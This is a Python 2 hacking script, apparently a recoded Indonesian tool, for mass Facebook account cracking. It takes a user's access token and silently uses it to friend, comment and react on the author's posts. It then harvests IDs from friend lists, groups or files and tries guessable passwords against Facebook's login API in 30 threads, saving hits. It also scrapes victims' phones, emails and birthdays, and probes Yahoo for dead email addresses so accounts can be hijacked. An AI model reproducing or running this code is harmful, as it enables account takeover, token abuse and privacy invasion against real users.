#!/usr/bin/python2
# coding=utf-8
# Autor    : ☆ RAKA ☆ ™︻®╤───────═◍➤
# Github   : Bangsat-XD
# Facebook : Raka Andrian Tara
# Twitter  : Bangsat-XD
# RECODE ASUUUUUUUUUUUU......!!!!!

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
from datetime import datetime
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 raka-andrian.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "[!] Exit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		
#########LOGO#########
logo = """\033[1;97m
              ██████╗░░█████╗░██╗░░██╗░█████╗░ ™
              ██╔══██╗██╔══██╗██║░██╔╝██╔══██╗
              ██████╔╝███████║█████═╝░███████║
              \033[1;95m██╔══██╗██╔══██║██╔═██╗░██╔══██║
              ██║░░██║██║░░██║██║░╚██╗██║░░██║
              ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
              \033[1;95mAuthor     : \033[1;97m☆ RAKA ☆ ™︻®╤───────═◍➤ 
              \033[1;95mGithub     : \033[1;97mBangsat-XD
              \033[1;95mFacebook   : \033[1;97mRaka Andrian Tara
              \033[1;95mInstagram  : \033[1;97mraka_andrian27
 """
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m Send Wait\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []

######MASUK######
def masuk():
	os.system('clear')
	print logo
	print "\033[1;95m ╔=======================================================╗"
	print "\033[1;95m  [01\033[1;97m]\033[1;96m\033[1;97m Login Facebook Token"
	print "\033[1;95m  [00\033[1;97m]\033[1;96m\033[1;97m Exit"
	print "\033[1;95m ╚=======================================================╝"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m ")
	if msuk =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m] Harap Isi Dengan Benar !"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		tokenz()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] Harap Isi Dengan Benar !"
		pilih_masuk()
		
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[\033[1;39m?\033[1;97m] \33[31;1m☆ ENTER TOKEN ☆ ™︻®╤───────═◍➤ \33[31;1m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		jalan ('\033[1;97mYou MUST FOLLOW ME FB ALC TO WORK SUCCEEFUL :) ')
		print '\033[1;97m[\033[1;39m✓\033[1;97m]\033[1;39m Ilove You A M A N D A'
		os.system('xdg-open  https://www.facebook.com/GARANGAN.KECHE')
		bot_komen()
	except KeyError:
		print "\033[1;97m[\033[1;39m!\033[1;97m] \033[1;39mToken Error !"
		time.sleep(1)
		masuk()

######BOT KOMEN#######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;39m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('100017584682867')
	kom = ('Good day😊')
	reac = ('LOVE')
	post = ('953529338576547')
	post2 = ('800676813861801')
	kom2 = ('Please send me this script🙏')
	reac2 = ('ANGRY')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()

######MENU#######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=' +toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Tidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Nama \033[1;91m: \033[1;92m"+nama+"\033[1;97m                  "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
	print 42*"\033[1;96m="
	print "\x1b[1;93m1.\x1b[1;93m Hack facebook Multi Brute"
	print "\x1b[1;93m2.\x1b[1;93m View List Of Groups              "
	print "\x1b[1;93m3.\x1b[1;93m Account Information              "
	print "\x1b[1;93m4.\x1b[1;93m Yahoo clone               "
	print "\n\x1b[1;91m0.\x1b[1;91m Logout            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mHarap Isi Dengan benar! "
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		grupsaya()
	elif unikers =="3":
		informasi()
	elif unikers =="4":
		yahoo()
	elif unikers =="0":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mHarap Isi Dengan benar!"
		pilih()
		
		
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;97m1.\x1b[1;93m Crack From Friend list"
	print "\x1b[1;97m2.\x1b[1;93m Crack Public List"
	print "\x1b[1;97m3.\x1b[1;93m Crack From Group Member"
	print "\x1b[1;97m4.\x1b[1;93m Crack From file"
	print "\n\x1b[1;91m0.\x1b[1;91m Exit"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mHarap Isi Dengan benar"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idg=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
	elif peak =="4":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan nama file  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mHarap Isi Dengan benar"
		pilih_super()
	
	print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
				print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
				print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
				print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass1 + '\n'
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
					print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
					print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
					print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass1 + '\n'
					cek = open("out/super_cp.txt", "a")
					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
						print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
						print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
						print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass2 + '\n'
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
							print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
							print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
							print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass2 + '\n'
							cek = open("out/super_cp.txt", "a")
							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['last_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass3 + '\n'
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
									print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
									print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
									print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass3 + '\n'
									cek = open("out/super_cp.txt", "a")
									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'Bangsat'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
										print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
										print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
										print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass4 + '\n'
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
											print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
											print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
											print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass4 + '\n'
											cek = open("out/super_cp.txt", "a")
											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											birthday = b['birthday']
											pass5 = birthday.replace('/', '')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
												print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
												print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
												print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass5 + '\n'
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
													print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
													print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
													print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass5 + '\n'
													cek = open("out/super_cp.txt", "a")
													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Sayang'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
														print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
														print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
														print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass6 + '\n'
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
															print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
															print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
															print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass6 + '\n'
															cek = open("out/super_cp.txt", "a")
															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File tersimpan \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	super()


def grupsaya():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	try:
		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
		gud = json.loads(uh.text)
		for p in gud['data']:
			nama = p["name"]
			id = p["id"]
			f=open('out/Grupid.txt','w')
			listgrup.append(id)
			f.write(id + '\n')
			print("\033[1;96m[✓] \033[1;92mGROUP SAYA")
			print("\033[1;96m[➹] \033[1;97mID  \033[1;91m: \033[1;92m"+str(id))
			print("\033[1;96m[➹] \033[1;97mNama\033[1;91m: \033[1;92m"+str(nama) + '\n')
		print 42*"\033[1;96m="
		print"\033[1;96m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
		print("\033[1;96m[+] \033[1;92mTersimpan \033[1;91m: \033[1;97mout/Grupid.txt")
		f.close()
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;96m[!] \x1b[1;91mTerhenti")
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except KeyError:
		os.remove('out/Grupid.txt')
		print('\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan')
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[✖] \x1b[1;91mTidak ada koneksi"
		keluar()
	except IOError:
		print "\033[1;96m[!] \x1b[1;91mError"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()

def informasi():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	aid = raw_input('\033[1;96m[+] \033[1;93mMasukan ID/Nama\033[1;91m : \033[1;97m')
	jalan('\033[1;96m[✺] \033[1;93mTunggu sebentar \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads(r.text)
	for i in cok['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			print 43*"\033[1;96m="
			try:
				print '\033[1;96m[➹] \033[1;93mNama\033[1;97m          : '+z['name']
			except KeyError: print '\033[1;96m[?] \033[1;93mNama\033[1;97m          : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;96m[?] \033[1;93mID\033[1;97m            : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;96m[?] \033[1;93mEmail\033[1;97m         : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mNo HP\033[1;97m         : '+z['mobile_phone']
			except KeyError: print '\033[1;96m[?] \033[1;93mNo HP\033[1;97m         : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mTempat tinggal\033[1;97m: '+z['location']['name']
			except KeyError: print '\033[1;96m[?] \033[1;93mTempat tinggal\033[1;97m: \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mTanggal lahir\033[1;97m : '+z['birthday']
			except KeyError: print '\033[1;96m[?] \033[1;93mTanggal lahir\033[1;97m : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mSekolah\033[1;97m       : '
				for q in z['education']:
					try:
						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mTidak ada'
			except KeyError: pass
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			menu()
		else:
			pass
	else:
		print"\033[1;96m[✖] \x1b[1;91mAkun tidak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()

def yahoo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;97m1.\x1b[1;93m Clone From Friend List"
	print "\x1b[1;97m2.\x1b[1;93m Clone From Public List"
	print "\x1b[1;97m3.\x1b[1;93m Clone From Group member group"
	print "\x1b[1;97m4.\x1b[1;93m Clone From file"
	print "\n\x1b[1;91m0.\x1b[1;91m Kembali"
	clone()
       
def clone():
	embuh = raw_input("\n\x1b[1;97m >>> ")
	if embuh =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
	elif embuh =="1":
		clone_dari_daftar_teman()
	elif embuh =="2":
		clone_dari_teman()
	elif embuh =="3":
		clone_dari_member_group()
	elif embuh =="4":
		clone_dari_file()
	elif embuh =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		

def clone_dari_daftar_teman():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token Invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	jalan('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;93mMengambil email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	jalan('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;93mStart \033[1;97m...')
	print ('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print("\033[1;96m[✓] \033[1;92mVULN")
					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama+ '\n')
					save = open('out/MailVuln.txt','a')
					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
					save.close()
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/MailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
		

def clone_dari_teman():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama\033[1;91m :\033[1;97m "+op["name"]
	except KeyError:
		print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 43*"\033[1;96m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print("\033[1;96m[✓] \033[1;92mVULN")
					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
					save = open('out/TemanMailVuln.txt','a')
					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
					save.close()
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
